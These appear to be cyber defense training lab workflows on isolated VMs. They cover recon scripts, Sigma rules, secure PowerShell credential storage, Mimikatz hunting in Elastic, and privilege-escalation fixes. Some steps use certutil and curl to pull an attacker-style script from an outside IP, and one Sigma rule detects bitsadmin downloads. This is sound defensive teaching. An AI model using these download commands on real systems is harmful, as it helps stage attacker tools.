2. Open a Windows Command Line terminal.


3. Run the recon.bat situational awareness script using the following command:
C:\Users\ksmith>.\recon.bat



Recon.bat is a prewritten situational awareness script containing several of the commands listed above.

![image](https://github.com/user-attachments/assets/45e9a9fc-9d7a-475c-809e-7ad55d11b94a)

![image](https://github.com/user-attachments/assets/22ee7712-617d-4573-9013-c43da7f23be5)

![image](https://github.com/user-attachments/assets/3fb43a06-8303-460e-aa4c-3eeae9d57057)

![image](https://github.com/user-attachments/assets/94242ed4-36cd-4278-aa7d-00bb576708a4)


-----------------------------------------

Workflow


1. Log in to the ch-edu-1 VM using the following credentials:
Username: ksmith
Password: CyberTraining1!



2. Open Windows Command Prompt.


3. Enter the following command to list the contents of the current directory:
dir



4. Enter the following command to download the reconnaissance script hosted privately by a threat actor from outside the mission partner network:
C:\Users\ksmith>certutil.exe -urlcache -split -f http://128.0.7.205/recon_original.txt



This command and the earlier ones like it are how many attacker tools and scripts are pulled onto a machine prior to their use. 

![image](https://github.com/user-attachments/assets/929cab93-8fde-4309-b967-09627d21f89e)

5. Enter the following command to confirm the new file has appeared in the current directory:
dir



The file recon_original.txt has been downloaded into the directory.


-------------------------------------------

Workflow


1. Log in to the ch-edu-1 VM using the following credentials:
Username: ksmith
Password: CyberTraining1!



This is one of the domain systems in the mission partner’s network.


2. Open a Windows Command Line terminal.


3. Enter the following command to test whether the current user can execute VBScript code located in a file: 
C:\Users\ksmith>cscript.exe test.vbs


![image](https://github.com/user-attachments/assets/6f2632d6-2300-407d-8b55-c2b508ac91ba)

This script silently created a new file on the OS. If this file had been located in an obscure directory and if the script had also added a Windows Registry key that regularly executed the file, this sort of code execution would directly lead to persistence on the compromised machine.


If an attacker can successfully execute this co de, it opens numerous functions to le verage, such as the creation of malicious shortcuts, the manipulation of valid installation packages, the creation of malicious Office macros, the opening of network connections, the creation of new users, and any other activity that an attacker may want to hide from a user inside otherwise-innocuous files.

---------------------------------------------

Workflow


1. Log in to the win-hunt VM using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open the Chrome browser, and log in to the Security Onion Console (SOC) using the corresponding bookmark and the following credentials:
Username: trainee@jdmss.lan
Password: CyberTraining1!



NOTE: A “Your connection is not private” warning will appear after clicking the bookmark. Click Advanced and then Proceed to 199.63.64.92 (unsafe) to get to the Security Onion login page.


3. Go to the Sysmon Visualizer dashboard of Kibana using the corresponding bookmark.


4. Set the date range for the prescribed baseline period.


Cyber Protection Team (CPT) leadership has determined that Dec 8, 2021 @ 00:00:00.000 to Dec 16, 2021 @ 23:30:00.000 was designated as the collection period for baseline activity.


This dashboard comes prepared with several visualizations that may be used to determine the environment’s baseline at a glance:
List of created process names.
Pie graph indicating the parent processes for all included records.
Bar graph of the users involved in the included records.
Table of the most common arguments in the command-line execution of the included records.

![image](https://github.com/user-attachments/assets/5172ea7e-088f-4c82-8b3e-d3dd11061797)

5. Enter the following query to determine what use of the net command looks like in this environment, as that is one of the most common in typical reconnaissance patterns:
process.name : net.exe

![image](https://github.com/user-attachments/assets/48e90c6b-39df-4e06-9b38-5ebc6076aa8b)

This command is being run from either the PowerShell or Windows Command Line terminal and is being run by only a few users in the domain. Therefore, the use of this command by anyone else might be worthy of the creation of a low-priority alert. Replace net.exe with additional process names typically used for situational awareness to perform similar analysis and create alerts.

![image](https://github.com/user-attachments/assets/c1301d42-242c-498b-a8b4-95507e4f0dd8)

![image](https://github.com/user-attachments/assets/ad8e6b38-76df-48de-8fed-b0d08fa5a949)



-----------------------------------------

Workflow


1. Log in to the win-hunt VM using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open the Chrome browser, and log in to the SOC using the corresponding bookmark and the following credentials:
Username: trainee@jdmss.lan
Password: CyberTraining1!

![image](https://github.com/user-attachments/assets/4fd429a3-845c-4152-8e91-e14632278eda)

3. Select Playbook on the left pane.


![image](https://github.com/user-attachments/assets/de85aeee-85ee-4983-8dc2-31b04718ade8)

4. Select Create New Play.


![image](https://github.com/user-attachments/assets/f1e6bd8f-4082-4b5d-b5ce-90ed9aee68ea)

5. Enter the Sigma Rule syntax:


NOTE: If paste errors are noticed copying the code into the VM, copy and paste from the file on win-hunt: C:\Users\trainee\Documents\bitsadmin.yml.



title: Bitsadmin Download
id: d059842b-6b9d-4ed1-b5c3-5b89143c6ede
status: experimental
description: Detects usage of bitsadmin downloading a file
references:
- https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
- https://isc.sans.edu/diary/22264
tags:
- attack.defense_evasion
- attack.persistence
- attack.t1197
- attack.s0190
date: 2017/03/09
modified: 2019/12/06
author: Michael Haag
logsource:
category: process_creation
product: windows
detection:
selection1:
Image:
- '*\bitsadmin.exe'
CommandLine:
- '* /transfer *'
selection2:
CommandLine:
- '*copy bitsadmin.exe*'
condition: selection1 or selection2
fields:
- CommandLine
- ParentCommandLine
falsepositives:
- Some legitimate apps use this, but limited.
level: medium

![image](https://github.com/user-attachments/assets/cce3e732-5891-4c73-bd2e-7a4c84f771b7)

6. It is good practice to convert the rule into the query syntax for the associated SIEM before finalizing the Play. This ensures that the rule is performing as intended.

![image](https://github.com/user-attachments/assets/29ce28f2-8a88-43b1-bb78-ea435f6e2ea8)

7. Select Create Play from Sigma.

![image](https://github.com/user-attachments/assets/d9a0f571-9e09-4a22-9a66-3762b963fabf)

8. Select Edit from the Draft Play pane.

![image](https://github.com/user-attachments/assets/7bcd3954-2c71-4e07-8cb7-cc3ed43ee88b)

9. Select Active from the drop-down menu Status.

![image](https://github.com/user-attachments/assets/929e12f8-228e-4184-8ee6-532ea46e6c81)

10. Select Submit.

![image](https://github.com/user-attachments/assets/5fb92378-3415-4253-ad54-14a7f955a694)

11. Select Active Plays from the right-hand toolbar to find the new Play among the existing Active Plays.

![image](https://github.com/user-attachments/assets/e1594c4e-faa8-452d-bd0a-caa2fd73a609)

It takes approximately 15 minutes for a new Play to be fully integrated into the SIEM before new alerts associated with the activity are active. 


While waiting for a new Play to become active, it is helpful to observe how one of the currently active Plays populates an alert in the Security Onion Alerts dashboard.


12. Open and inspect the Whoami Play in the active plays by selecting the Play number. The Sigma rule syntax is expanded by selecting View Sigma.

![image](https://github.com/user-attachments/assets/8efd8c2f-76a3-4b5c-a531-50e2726d9f5c)

13. Log in to the ch-edu-1 VM using the following credentials:
Username: ksmith
Password: CyberTraining1!



14. Open a Windows Command Line terminal, and execute the whoami command:
C:\\Users\ksmith>whoami

![image](https://github.com/user-attachments/assets/710e95b3-c4f5-4b22-82dd-237442f065fa)

15. In the win-hunt machine, open the Security Onion Alerts console using the Alerts bookmark for the last 24 hours time period.


![image](https://github.com/user-attachments/assets/541a8d16-d18c-449a-b535-b86d973fdcaf)

The  execution of the commands, bina ries, or patterns identified by Plays in Security Onion Playbook triggers alerts in this dashboard, which is how potentially malicious activity may be monitored.

------------------------------------------

Workflow


1. Log in to the ch-dev-cent VM using the following credentials:
Username: trainee
Password: CyberTraining1!

This is a Linux system in the mission partner’s network.


2. Click Activities and open Terminal.

![image](https://github.com/user-attachments/assets/aa1d1ffa-8faa-4989-abe4-64c874e3d940)

3. Enter the following command to run a prewritten situational awareness script.
[trainee@ch-dev-cent ~]$ ./recon.sh

![image](https://github.com/user-attachments/assets/8fbcfd1b-0c65-4c26-bfce-ebf0a1651d12)


![image](https://github.com/user-attachments/assets/66c6abdc-18ed-4ac8-aa0a-dcc11cea67b8)

![image](https://github.com/user-attachments/assets/751c70c2-5507-4336-a392-92c2b2cbe8f8)

-----------------------------------

Workflow


1. Log in to the ch-dev-cent VM using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open Terminal.


![image](https://github.com/user-attachments/assets/7bd5bb3b-34d2-4fac-bd4e-07e08a352311)

Figure 9.1-22


3. Run the following command to verify the contents of the current directory:
ls -l



4. Run the following command:
[trainee@ch-dev-cent ~]$ curl http://128.0.7.205/recon_original.sh -o recon_original.txt


![image](https://github.com/user-attachments/assets/2987b10d-ea97-478f-9a42-77d33a53c94c)

5. Review the new contents of the directory by running the following command:
ls -l



Note that the new file recon_original.txt has appeared.

![image](https://github.com/user-attachments/assets/03b31927-6df6-47d0-89cf-a9d293d5dcda)

![image](https://github.com/user-attachments/assets/fe547c05-24ae-424b-9ddb-bd7f1986314a)


-------------------------------------------




Workflow


1. Log in to the ch-dc1 VM using the following credentials:
Username: trainee
Password: CyberTraining1!



This is the Domain Controller (DC) in the mission partner’s network.


2. Open a PowerShell terminal as an Administrator.


3. Import the grouppolicy module into the current PowerShell session:
PS C:\Windows\System32> Import-Module grouppolicy 



This allows a user access to all the necessary group policy management cmdlets during the current session.


4. Create a new Group Policy Object with a name and description relevant to the security control being enforced.
PS C:\Windows\System32> New-GPO -Name "PSExecutionPolicy" -Comment "Enforces cryptographic signing on any executed PowerShell scripts"


![image](https://github.com/user-attachments/assets/9377ec3b-08eb-4b79-a825-851278ef8e39)

5. Use the Set-GPRegistryValue cmdlet to configure the new GPO. 
PS C:\Windows\System32> Set-GPRegistryValue -Name "PSExecutionPolicy" -Key "HKLM\Software\Policies\Microsoft\Windows\PowerShell" -ValueName ExecutionPolicy -Type String -Value "AllSigned"

![image](https://github.com/user-attachments/assets/64689afe-6d3e-4e09-9933-a7e4c9897a0a)

6. Link the new GPO to all systems in the domain.
PS C:\Windows\System32> New-GPLink -Name "PSExecutionPolicy" -Target "ou=Systems,dc=vcch,dc=lan"


![image](https://github.com/user-attachments/assets/3e12de4c-8b5b-455b-90d9-c3c809bc3142)

For those users for whom PowerShell is allowlisted, only signed scripts may be run, significantly improving the security state of the enterprise.




------------------------


#### CDAH-M9L2-Dumping Credentials ####


Workflow


1. Log in to the ch-tech-1 Virtual Machine (VM) using the following credentials:


Username: trainee
Password: CyberTraining1!



2. Open Sublime Text 3:







3. Select File > Open File..., and open smtp.settings:
C:\Users\trainee\AppData\Roaming\smtp\smtp.settings



NOTE: The AppData folder is normally hidden by default.


The smtp.settings is an example configuration file for an SMTP client to communicate with an SMTP server. The configuration defines the SMTP host, port, protocol, username, and password. If not stored properly, a configuration file, such as the SMTP file, can become an easy target for adversaries looking to dump credentials and perform lateral movement. 


![image](https://github.com/user-attachments/assets/5cf9ee08-b5f5-4f36-aa12-8b1415cec824)

Examine smtp.settings, and notice that smtp_username and smtp_password are stored in plaintext, meaning once the adversary discovers this file they have the credentials. The stored username is trainee@vcch.lan and password is CyberTraining1!. The file smtp.settings is an example of insecure system credential storage and should not be allowed on any host or any system.


A secure option for saving and utilizing credentials is to use integrated Windows authentication with the SAM database on the local host, when available to the application. Windows securely collects credentials via user input on the user login interface or programmatically via the API for the SAM database. The credential information collected is then presented to an authenticating system or service. The physical location of the SAM database is located in the following path:
%SystemRoot%\system32\config\SAM



The SAM database is loaded into the registry on system startup. All interactions with the SAM database use Windows functions and are updated in the registry. The majority of registry keys that are relevant to attackers and defenders are in the H_KEY_LOCAL_MACHINE (HKLM) hive. This root is maintained in memory. On bootup, the kernel loads the keys that are contained in HKLM from disk and creates others dynamically based on the hardware attached to the system. The subkeys that have restricted access have restrictions for the administrator account and are normally modified under the context of the local account SYSTEM. SYSTEM is used by the OS and services that run under Windows to access Windows internals. The registry entries under the SAM, SECURITY, and Boot Configuration Data (BCD) keys are modified and changed with specific tools and applications within Windows to limit and prevent accidental or intentional configuration changes that may make the system unusable. 


Changes that an attacker makes can be detected by watching for changes to the keys HKLM\SAM\SAM\DOMAINS\Account\Users\Names\<accountname>. Validating when new users are added and changes to the Local Administrators group (HKLM\SAM\SAM\Domains\Builtin\Aliases\0000220\) can identify rogue accounts and suspicious activity. 


--------------------------

Workflow


1. Log in to the ch-tech-1 VM using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open PowerShell.


3. Execute the following command to securely prompt the user for credentials:
PS C:\Users\trainee> $Mycredential = Get-Credential 



The cmdlet Get-Credential creates an object for a specified user name and password. 


The following screen appears:

![image](https://github.com/user-attachments/assets/88b1089a-159a-496a-9c20-5886de029417)

4. Enter the following credential information and select OK:
Username: trainee
Password: CyberTraining1!



$Mycredential is now a newly-created object, linked with the trainee account on the local host.


5. Execute the following command to display the credential object:
PS C:\Users\trainee> $Mycredential



The output provides the UserName but does not provide the password in plaintext since the password is stored as a SecureString.


![image](https://github.com/user-attachments/assets/1aa3a535-ada0-42b3-9858-2f2acfe2c001)




6. Execute the following commands to securely prompt a user for credentials from the command line:
PS C:\Users\trainee> $user = Read-Host "Enter Username"
Enter Username: trainee
PS C:\Users\trainee> $pass = Read-Host "Enter Password" -AsSecureString
Enter Password: CyberTraining1!

![image](https://github.com/user-attachments/assets/1166e4e2-c14e-41f9-9218-b161467bdf7f)

The Read-Host command creates a variable and securely stores the credential information associated with it. Notice the user's input is masked when the -AsSecureString option is used. A downside of creating an object or variable using the SecureString is that SecureString objects cannot be saved for a file for later use. To save a SecureString object, it must be converted to an encrypted standard string.


7. Execute the following command to convert a plaintext string to a SecureString and then to an encrypted string:
PS C:\Users\trainee> "CyberTraining1!" | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString



The password CyberTraining1! is entered using the ConvertTo-SecureString as plaintext. This takes the input (CyberTraining1!) and converts it into a SecureString. The cmdlet ConvertFrom-SecureString converts SecureString objects into an encrypted standard string. The input is converted into an encrypted standard string. 

![image](https://github.com/user-attachments/assets/5df760b2-c20c-4aac-aa6e-5f55e3494fe2)

The encrypted string can be saved and returned to later for retrieval and use.


The cmdlets are an effective means of managing and storing credential information. PowerShell scripting often requires credential information to automate processes — the information required should not be stored as plaintext. Using the cmdlet ConvertTo-SecureString, credential information is managed securely in PowerShell. The cmdlet ConvertFrom-SecureString encrypts and stores the credential information. 


The cmdlet ConvertFrom-SecureString uses the Advanced Encryption Standard (AES) algorithm to encrypt credentials. The AES algorithm converts the string stored in SecureString to an encrypted standard string. 


8. Execute the following command:
PS C:\Users\trainee> Get-Credential | Export-CliXml  -Path MyCredential.xml



The cmdlet Export-Clixml exports the encrypted credential object. By encrypting credential objects, PowerShell ensures that only the account associated with the object can decrypt it. 


9. When prompted, enter the following credentials, and select OK:
Username: trainee
Password: CyberTraining1!

![image](https://github.com/user-attachments/assets/4f893158-8b0e-41bf-9a21-f4f34fbb3328)




The following cmdlet is an automated alternative to the cmdlet utilized in Step 7. The cmdlet takes the entered credentials, encrypts the credentials using the AES algorithm, and outputs the encrypted credentials to the file MyCredential.xml located in the following path:
C:\Users\trainee



10. Open MyCredential.xml in Internet Explorer.
C:\Users\trainee\MyCredential.xml


![image](https://github.com/user-attachments/assets/ffc6d616-fb95-472a-b4f5-7700eaa4431d)

Notice the password is not saved in plaintext but is safely encrypted in the file. The password can be used in programs, such as PowerShell, where it can be securely shared and decrypted.


-----------------------------

Hunting for Credential Dumping
Walk through the creation and development of visualizations and hunting strategies to detect credential dumping on the network. 

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Google Chrome.

﻿

3. Select the Visualize - Elastic bookmark. 

﻿

NOTE: A “Your connection is not private” warning will appear after clicking the bookmark. Click Advanced and then Proceed to 199.63.64.92 (unsafe) to get to the Security Onion login page.

﻿

4. Open Security Onion using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. In Visualize Library, select Create visualization.

﻿

6. In New visualization, select Aggregation based > Data Table.

﻿

7. Within the New Line/Choose a source window, select *:so-*.

﻿

8. Set the time span for the data table to December 10, 2021 @ 14:00:00.000 - December 10, 2021 @ 14:30:00.000.

﻿

9. Add a bucket using split rows with the following information:

Aggregation: Terms

Field: agent.hostname.keyword

Metric: Count

Order: Descending 

Size: 100

10. Add another bucket using split rows with the following information:

Aggregation: Terms

Field: process.name.keyword

Metric: Count

Order: Descending 

Size: 100

If needed, select Update to update the data in the table.


![image](https://github.com/user-attachments/assets/2ffc3a7b-ba30-431b-8dc6-ea3c0699a2c9)

The table displays all the processes on the hosts through the VCCH network. The visualization enables detection based on the process name. The results of this data table include numerous pages with only a 30-minute time span. This means detection using this data table needs to include filters and query parameters. 


NOTE: The table is sorted by descending on the column Count. 


11. In the Search, execute the following query to search for the Mimikatz process:
process.name.keyword: "mimikatz.exe"



Mimikatz is a tool frequently used to gain credential information. The query asks the data table to return only records that use the process mimikatz.exe on the VCCH network. 


![image](https://github.com/user-attachments/assets/8c2cc500-5d79-43de-8cfd-d919dca71b43)

The data table displays that the process mimikatz.exe was used twice in the 30-minute time span of the query.


12. Add another bucket using split rows with the following information:
Aggregation: Terms
Field: event.code.keyword
Metric: Count
Order: Descending 
Size: 100

Event.code is the event field associated with the log file. 


![image](https://github.com/user-attachments/assets/77ad9aae-0f57-4445-8cb8-e4a855881cda)

The data table displays that the process mimikatz.exe was seen or logged in Windows event ID 4688 and Sysmon event ID 1 on host ch-tech-2. As stated previously in this lesson, Windows event ID 4688 and Sysmon event ID 1 are collected when a process is created. These events, paired with the process mimikatz.exe, are cause for concern that MCA is occurring on the network. The data table is useful in initial discovery of suspicious activity, however, it does not tell the entire story. 


13. Open a new tab and select the Discover - Elastic bookmark. 


14. Within Discover - Elastic, set the time span for the data table to December 10, 2021 @ 14:00:00.000 – December 10, 2021 @ 14:30:00.000.


15. In the Search, execute the following query to search for ProcessAccess related events:
event.code: 10



As stated previously in this lesson, Windows event ID 4656 and Sysmon event ID 10 are collected when a process is accessed. This means a process accessed or used another process. Once Windows event ID 4688 and Sysmon event ID 1 are identified with a suspicious process, the next step is to hunt for Windows event ID 4656 and Sysmon event ID 10. Hunting for Windows event ID 4656 and Sysmon event ID 10 discovers the use of the suspicious process found, in this case, mimikatz.exe. The above query filters the data collected by the SIEM to only show Sysmon Event ID 10.


With the query applied, the Discover page looks similar to Figure 9.2-11:

![image](https://github.com/user-attachments/assets/4557b8bc-27d2-49f4-b3d4-b80226ae54c5)

The Discover page indicates there are six occurrences of the Sysmon event ID 10. 


16. Add a filter to the Discover page for the ch-tech-2 machine with the following information, and select Save:

![image](https://github.com/user-attachments/assets/355b3c99-54fb-4a99-ac81-b4f518452a42)

As shown in the data table previously created, the mimikatz.exe process was run on the ch-tech-2 host. The Discover page now only shows data collected from the ch-tech-2 machine.


17. Drill down on the first record that was collected December 10, 2021 @ 14:03:14.184.


18. Add the process.executable and process.name fields to the Discover table.

![image](https://github.com/user-attachments/assets/4f1607b1-1dc3-44c5-9a84-9f262d153088)

Notice the process associated with Sysmon event ID 10 is the executable lsass.exe. lsass.exe is frequently targeted by adversaries who have gained access to a host and are attempting to dump credentials and elevate privileges. A tool such as Mimikatz is frequently used in this campaign. 


19. Add the winlog.event_data.TargetImage field to the Discover table.

![image](https://github.com/user-attachments/assets/d2ea4ed4-dce0-43ab-b68c-9e5cf766cda3)


The winlog.event_data.TargetImage field displays the path to the process that initiated the process, which caused Sysmon event ID 10 to be recorded. In Figure 9.2-14, mimikatz.exe was the process that accessed and used the process lsass.exe. Additionally, mimikatz.exe was run out of Luke.Dunlap's directory. The user account Luke.Dunlap and host ch-tech-2 must immediately be disabled and reviewed by the security team as they likely have been compromised by an adversarial presence attempting to dump credentials and elevate privileges.  


--------------------


Hunting for Credential Dumping Activity on the VCCH Network
As with host ch-tech-2, the VCCH network is vulnerable to suspicious activity including credential dumping. The host ch-tech-2 may not be the only one on the network that is being exploited by a persistent threat. The VCCH network owner has requested analysis of their network to determine if there are additional adversarial presences attempting to dump credentials from an exploited host. VCCH has requested a review of data collected from December 13, 2021, specifically between 13:45:00.000 and 14:45:00.000.

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

﻿

Username: trainee
Password: CyberTraining1!
﻿

2. Log in to Security Onion and Elastic Stack using the following credentials:

﻿

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

3. Select the Discover - Elastic bookmark, and create a data table to aid in the investigation of the questionable network activity. Set the time span in Elastic to December 13, 2021 @ 13:45:00.000 – 14:45:00.000. 

![image](https://github.com/user-attachments/assets/d3f37d1a-3b16-4817-a4ef-d630ac25ec28)

![image](https://github.com/user-attachments/assets/f076d761-76ad-4d7f-b82e-83563047a952)

-----------------------------

Host Activity
ch-tech-1 has experienced the process mimikatz.exe running within the specified time span. mimikatz.exe is malware that is frequently used by adversaries to leverage vulnerabilities and find useful credential information. Any use of mimikatz.exe should be considered suspicious and must be investigated. 

﻿

Events Associated with mimikatz.exe
﻿

Workflow

﻿

NOTE: The following step continues from the previous steps.

﻿

4. Add the event.code field to the data to discover the events associated with mimikatz.exe. 

![image](https://github.com/user-attachments/assets/cb97f52d-8f64-4115-bef1-e6dd4f90496d)
![image](https://github.com/user-attachments/assets/2cc3759f-69a6-47e8-84c4-89905724b103)




Discover Activity
﻿

Figure 9.2-15

﻿

Event codes 1, 10, and 4688 are associated with mimikatz.exe. These events needs to be investigated further to determine the type of activities that are associated with them.

﻿![image](https://github.com/user-attachments/assets/12fcfffd-02f3-486f-a2f2-873131e5bb61)


Workflow

﻿

NOTE: The following step continues from the previous steps.

﻿

5. Access the Discover page. Filter the page by host ch-tech-1. Ensure the time span is set to the span in question. 

----------------

Hunting for Sysmon Event ID 10

![image](https://github.com/user-attachments/assets/3075ad2a-0bd6-4ce3-a135-d336cda98948)

The ch-tech-1 host experienced 1,926 events over the 60-minute time span. 


Based on the data table created previously, ch-tech-1 was used to access mimikatz.exe (Sysmon event ID 1). Based on the data table, mimikatz.exe on host ch-tech-1 was used to access another process (Sysmon event ID 10).


Workflow


NOTE: The following step continues from the previous steps.


6. Query the Discover page for Sysmon event ID 10. Ensure the ch-tech-1 host is still in place.


![image](https://github.com/user-attachments/assets/b351ff53-fa3e-4ddd-87ab-bf0cdc0162bb)

![image](https://github.com/user-attachments/assets/605ab211-42f0-47ad-8f06-1c4355429d15)


-------------------------------



Workflow


NOTE: The following step continues from the previous steps.


7. Include an additional parameter in the query. Query the Discover page for Sysmon event ID 10 and mimikatz.exe. Ensure the ch-tech-1 host is still in place. 

![image](https://github.com/user-attachments/assets/912c4945-63b0-4070-ac5a-10f18c8894e0)


![image](https://github.com/user-attachments/assets/b8b1a40a-0c86-4b03-84a6-564b1f878788)


----------------------------------

Workflow


NOTE: The following step continues from the previous steps.


8. Review the Sysmon event ID 10 log file details, and answer the following questions. 

![image](https://github.com/user-attachments/assets/38a6d91b-936c-4958-a134-279d6e481791)

![image](https://github.com/user-attachments/assets/4b8fad1e-8704-4ed7-8c32-3891e5a4ab03)

-----------------------------

![image](https://github.com/user-attachments/assets/55b78b23-0fe0-4f9a-9130-c204c41ffdab)

![image](https://github.com/user-attachments/assets/9710f1f2-3ce4-41a4-ad7b-8d8d780b7fbd)


---------------------------------------

![image](https://github.com/user-attachments/assets/f9e95b57-8b2b-4f1a-b225-373ae9c25276)

![image](https://github.com/user-attachments/assets/0c58121c-3c05-4083-a7b0-267170d15f09)

-----------------------

#### CDAH-M9L3-UNIX Privilege Escalation ####

Find and Correct Unquoted Service Paths
Find and correct unquoted service paths on the Windows system. In the following tasks, the ch-tech-3 Virtual Machine (VM) is used as the vulnerable Windows system that has unquoted service paths that need to be corrected. 

﻿

Workflow﻿

﻿

1. Log in to the ch-tech-3 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a command prompt with administrator privileges.

﻿

3. Enter the following command to identify all unquoted service paths:

C:\Windows\system32>wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "|findstr /i /v """
﻿

In the above command the PowerShell wmic service get switch will return a list of the services on a Windows system using the "Service" application management tool. The command will return the name, displayname, pathname, and startmode of the services. This command is piped with the findstr command. The findstr command will search for patterns of text in files. In the above command the /i switch will ignore the characters that are specified when searching for a string. The /v switch will print only the lines that don't contain a match. In the above command those switches combined will ignore any characters containing the word "Auto" and any objects that have quotation marks. It will then print all of the other lines.  

﻿

Note the three paths outside C:\Windows\ that have spaces in the service path.

﻿

4. Enter the following command to identify unquoted service paths outside C:\Windows\:

C:\Windows\system32>wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
﻿

The findstr commands filter for services that automatically start and do not contain quotation marks.

﻿

All services with unquoted executable paths are listed.

﻿

5. Open the Windows Registry Editor (regedit.exe).

﻿

6. Navigate to the following registry key, and examine the ImagePath value:

﻿

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Some Vulnerable Service

![image](https://github.com/user-attachments/assets/4ed6293f-13c7-451f-929b-0fabeefe90d3)

The ImagePath entry does not have quotation marks surrounding it. 


7. Place quotation marks around the registry entry in the value ImagePath (see Figure 9.4-2):

![image](https://github.com/user-attachments/assets/d728e92d-a666-4973-ad41-80401111c8aa)

8. Return to the command prompt, and run the below command again: 
C:\Windows\system32>wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

 
There is now one less vulnerable unquoted service path.

![image](https://github.com/user-attachments/assets/4f1a12e2-266e-47ca-8dd1-9a49e91ed91c)

9. Return to the Registry Editor, and navigate to the below path:
 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VMwareCAFManagementAgentHost
 
Again, the ImagePath value does not have any quotation marks.
 
10. Place quotation marks around the ImagePath value (see Figure 9.4-4):

![image](https://github.com/user-attachments/assets/356192dc-10e6-40a2-9db1-b5291229285e)

11. Run the following command again to verify the changes: 
C:\Windows\system32>wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

 
Only one unquoted service path is left. 
 
Keep the windows open to respond to the following questions.


--------------------------------------

#### CDAH-M9L4-Windows Privilege Escalation ####

Display the Current PATH Variables
In the following exercise, review how to display the current PATH variables for the logged-on user. The exercise also demonstrates the where command and when and how it can be used. 

﻿

Workflow﻿

﻿

1. Log in to the ch-treasr-1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!

﻿

2. Open a command prompt, and run the following command to view the PATH variable: 

C:\Users\trainee>echo %PATH%
﻿

Another useful Windows command is the where command. This command can be used to display the path or location of any files or executables that match the given search pattern.

﻿

3. Enter the following command to view any files that reside in the Public directory:

C:\Users\trainee>where $public:*.*
﻿

4. To view any files named Secret and their file paths, input the following command:

C:\Users\trainee>where /r C:\ Secret.txt
﻿

A break down of the above command can be found below:

where - command that searches for and displays the location of a file
/r - tells the where command to run recursively
C:\ - tells the where command to start the search from C:\ directory. 
Secret.txt - tells the where command to search for the file Secret.txt
The where command can also be used to view the file size and the last modified date and time for all files that match the given parameters within the command. The command where /f /t *.dll displays all DLL files on the system and the last modified date of each of them. The where command can also be used to search a single directory to narrow down the results. The command where /r C:\ chrome.exe displays the full path to the Google Chrome executable. 

﻿

Keep the windows open to respond to the following question.



------------------------------


Use Autoruns to Identify Suspicious Programs
In this exercise, use the Windows Sysinternals Autoruns tool to identify suspicious programs that run when a user logs into the computer.

﻿

Workflow﻿

﻿

1. Log in to the ch-treasr-1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Start the Autoruns application from the desktop with administrator privileges.

﻿

3. Select the Logon tab at the top:

﻿![image](https://github.com/user-attachments/assets/07d1ddad-c217-49bf-9eab-cb6581fba28b)

Under the Logon tab, a run key is highlighted in red for a file called VulnerableProcess.


![image](https://github.com/user-attachments/assets/59ecc38d-0e62-4b78-aedc-1a7547fe5dfa)


Also, the registry entry is one of the Windows default run keys mentioned earlier.


This is a common technique used by malware to survive a reboot and achieve persistence on a target. The Description column is empty, and the Publisher column says “(Not Verified).” Although that alone does not mean that the process is malicious, it is worthy of further investigation. The WindowsDefender row is also highlighted in red, but the Publisher column has a valid digital signature, Microsoft Corporation. The reason that Autoruns is saying WindowsDefender is not verified is because Sysinternals is not connected to the internet in this environment; therefore, it cannot verify the file hash for those components. The same is true for the Windows Mail entry a few rows below WindowsDefender. In an environment connected to the internet, if these entries are still highlighted in red and they do not have a verified publisher, further inspection is warranted.


--------------------------


Check the Privileges of the Current User
The following exercise demonstrates how to check the Windows privileges of a current logged-in user. This can be helpful to trainees to ensure that users have only the privileges they need to perform their job roles. 

﻿

Workflow﻿

﻿

1. Log in to the ch-treasr-1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a command prompt, and enter the following command to view the trainee user’s privileges:

C:\Users\trainee>whoami /priv


![image](https://github.com/user-attachments/assets/6338dea8-470b-44dd-a7a8-a71e03bdfc2d)


3. Open a command prompt as administrator, and enter the following command to view the elevated privileges:
C:\Windows\system32>whoami /priv


![image](https://github.com/user-attachments/assets/6707ed5b-4bcf-4075-ac52-9768b1bde5b2)


-----------------

Find and Correct the AlwaysInstallElevated Settings
In the following exercise, find the incorrect Windows privilege settings on the system using PowerShell. Then create a domain-level GPO on the Domain Controller to mitigate the incorrect settings.

﻿

Workflow﻿

﻿

1. Log in to the ch-tech-1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open PowerShell as a regular user.

﻿

3. Enter the following commands to use the Test-Path cmdlet to see if the registry path is present on a system:

PS C:\Users\trainee> Test-Path -Path 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer'
PS C:\Users\trainee> Test-Path -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer'
﻿

Figure 9.4-9 shows the results if the path is present on the system:


![image](https://github.com/user-attachments/assets/44dc45bb-e221-418a-ac9b-e5fed0b590fc)


4. Use the Get-ItemProperty command to see what the values for the AlwaysInstallElevated entries are set to:
PS C:\Users\trainee> Get-ItemProperty -Path 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer'

PS C:\Users\trainee> Get-ItemProperty -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer'



Because the values on this system are set to 1, the settings are enabled. The proper way to mitigate this is to create a domain-level GPO on the Domain Controller and have that GPO set to disable the AlwaysInstallElevated setting. 


5. Log in to the ch-dc1 VM using the following credentials:
